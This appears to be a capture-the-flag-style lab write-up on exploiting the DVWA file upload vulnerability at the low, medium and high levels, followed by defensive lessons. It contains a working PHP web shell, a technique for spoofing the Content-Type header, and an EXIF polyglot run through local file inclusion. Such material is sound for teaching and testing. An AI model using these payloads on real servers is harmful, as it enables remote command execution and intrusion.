# Day 12 DVWA File Upload Vulnerability — Full Walkthrough

> **Disclaimer:** This walkthrough is intended for educational purposes only. Only practice on systems you own or have explicit permission to test. DVWA is a legal, intentionally vulnerable environment designed for this purpose.

---

## Prerequisites & Setup

Ensure DVWA is running on your Kali Linux machine:

```bash
sudo service apache2 start
sudo service mysql start
```

Then navigate to `http://localhost/dvwa` and log in with:
- **Username:** `admin`
- **Password:** `password`

Go to **DVWA Security** and set your desired security level before starting each section.

---

## Low Security

At this level there is **zero validation** — the server accepts any file type without restriction.

### Goal
Upload a PHP web shell and execute system commands on the server.

### Steps

**1. Create a simple PHP web shell:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**2. Upload the shell:**
- Go to `DVWA → File Upload`
- Click **Browse**, select `shell.php`, and click **Upload**
- You should see a success message with the upload path, e.g.:
  ```
  ../../hackable/uploads/shell.php successfully uploaded!
  ```

**3. Find the correct URL path:**
```bash
find /var/www -name "shell.php" 2>/dev/null
```

**4. Execute commands via the shell** (open a new browser tab):
```
http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=id
http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=ls /etc
```

### Why It Works
There is no filtering on file type, extension, or content. The server blindly accepts and stores whatever is uploaded.

### Troubleshooting
- If you get a 404, verify the upload folder is writable:
  ```bash
  ls -la /var/www/html/dvwa/hackable/uploads/
  sudo chmod 777 /var/www/html/dvwa/hackable/uploads/
  ```

---

## Medium Security

The server now checks the **MIME type** (Content-Type header). However, this header is client-controlled and can be bypassed with Burp Suite.

### Goal
Spoof the Content-Type header to trick the server into accepting a PHP file.

### Steps

**1. Start Burp Suite and configure your browser proxy:**
```bash
burpsuite &
```
Set your browser proxy to `127.0.0.1:8080`.

**2. Rename your shell to have an image extension:**
```bash
cp shell.php shell.jpg
```
> This is important — the browser only sends an image Content-Type if the file has an image extension.

**3. Turn Intercept ON in Burp Suite** (Proxy → Intercept → Intercept is on)

**4. Upload `shell.jpg` through the DVWA File Upload page.**

**5. In Burp, modify the intercepted request:**

You will see something like:
```
Content-Disposition: form-data; name="uploaded"; filename="shell.jpg"
Content-Type: image/jpeg
```

Make these two changes:
- Change `filename="shell.jpg"` → `filename="shell.php"`
- Leave `Content-Type: image/jpeg` as-is (this is what fools the server)

**6. Click Forward in Burp.**

**7. Execute the shell:**
```
http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=id
```

### Why It Works
The server only validates the `Content-Type` header, which is sent by the client and can be freely manipulated. It never inspects the actual file content.

---

## High Security

The server now checks the **file extension** and uses `getimagesize()` to verify the file is a real image. You need to create a **polyglot file** — a file that is simultaneously a valid image and contains executable PHP code.

### Goal
Embed PHP code inside a real image's metadata, then execute it via the File Inclusion vulnerability.

### Steps

**1. Create a PHP-injected image using exiftool:**
```bash
cp /usr/share/pixmaps/kali-menu.png shell.php.png
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.php.png
```

**2. Upload `shell.php.png` through DVWA:**
- It passes validation because it has a `.png` extension and `getimagesize()` returns valid data
- Upload succeeds ✅

**3. Execute via the File Inclusion vulnerability (LFI):**

Navigate to the DVWA File Inclusion page and use it to include your uploaded file:
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.php.png&cmd=id
```

The PHP code embedded in the image EXIF comment gets interpreted and executed.

### Why It Works
The file passes both the extension check and `getimagesize()` validation. When PHP interprets the file through the LFI vulnerability, it executes the injected comment as code.

---

## Impossible Security (For Reference)

At **Impossible** level, DVWA implements proper defenses that defeat all of the above techniques:

- Regenerates a random filename (no control over the saved filename)
- Re-encodes the image using `imagecreatefromjpeg()` / `imagecreatefrompng()`, stripping all metadata
- Verifies file magic bytes (not just extension or MIME type)
- Stores files outside the web root or with a non-executable extension

There is no practical bypass at this level — this is the correct way to handle file uploads.

---

## Summary Table

| Security Level | Bypass Method | Root Cause |
|---|---|---|
| Low | Direct PHP upload | No validation at all |
| Medium | Burp Suite MIME spoof | Client-side MIME type check only |
| High | Exiftool polyglot + LFI | Extension-only check, weak image validation |
| Impossible | Not bypassable | Proper server-side validation & re-encoding |

---

## Key Lessons

- Never trust client-supplied headers (Content-Type) for security decisions
- File extension checks alone are insufficient — content must be validated
- Even `getimagesize()` can be fooled by polyglot files
- The safest approach is to re-encode uploaded images server-side, stripping all metadata
- Files should never be stored in a web-accessible location with executable permissions

---

*Practiced on Kali Linux with DVWA running on Apache2/MySQL (Debian)*